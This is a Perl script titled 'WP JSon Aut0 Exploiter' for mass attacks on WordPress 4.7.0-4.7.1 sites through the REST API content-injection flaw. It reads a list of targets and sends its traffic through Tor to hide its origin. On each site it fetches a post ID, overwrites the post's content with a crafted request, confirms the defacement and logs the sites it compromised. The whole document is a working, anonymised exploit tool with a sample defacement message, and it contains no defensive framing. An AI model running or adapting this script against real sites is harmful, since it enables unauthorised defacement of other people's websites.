#!/usr/bin/perl
#                        ->Coder By CrashBandicot
#                        -> Coded in Fast 

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common;
use LWP::Protocol::socks;

if ($^O =~ /Win/) { system("cls"); } else { system("clear"); }

print "
	              
               WP JSon Aut0 Exploiter
   WordPress 4.7.0-4.7.1 REST API Content Injection
               by CrashBandicot         

         Usage : $0 list.txt

\n";

open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$webs = $_;

if($webs !~ /http:\/\//){ $webs = "http://$webs"; } 

print " [+] Scanning -> $webs\n";

 
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$ua->timeout(30);
$ua->proxy([qw/ http https /] => 'socks://127.0.0.1:9150'); # Tor browser socks
$ua->default_header("Content-Type" => "application/json");


# GET Random Post ID
$gett = $ua->get($webs."/wp-json/wp/v2/posts")->content;
if($gett =~m/\"id\":(.*?),/g) {
	$id = $1;

	print "  [+] $webs JSON ID Found (".$id.")\n";

#	$payload = '{  "id": "'.$id.'fff", "title": "by fucker", "content": "hacked by fucker" }';
       
       # Update Content 
       $post = $ua->get($webs."wp-json/wp/v2/posts/".$id."?id=".$id."justfuck&content=by%20Hackerz")->content;
      
        unless($post = ~/:400/) {
             
            # Check if Injection Done
            $get = $ua->get($webs."/wp-json/wp/v2/posts/")->content;
                     if($get =~/Hackerz/) {
	
	                     print "\n    [+] Content Injected Succes for $webs\n\n"; 
	                     open(save, ">>wp_json_results.txt"); 
	                     print save "$webs\n";
                      close save; 
                      } else { 
	                    print "  [-] $webs Content Injected but Regex not found\n\n";
                                   open(saEve, ">>wp_json_results_probably.txt"); 
                                      print saEve "$webs\n";
                                      close saEve;
	                               } 
                        } else { print "   [-] $webs 400 Not allowed for Update\n\n"; }
} else { print "  [-] $webs WP-JSON API not Found\n\n"; }
}
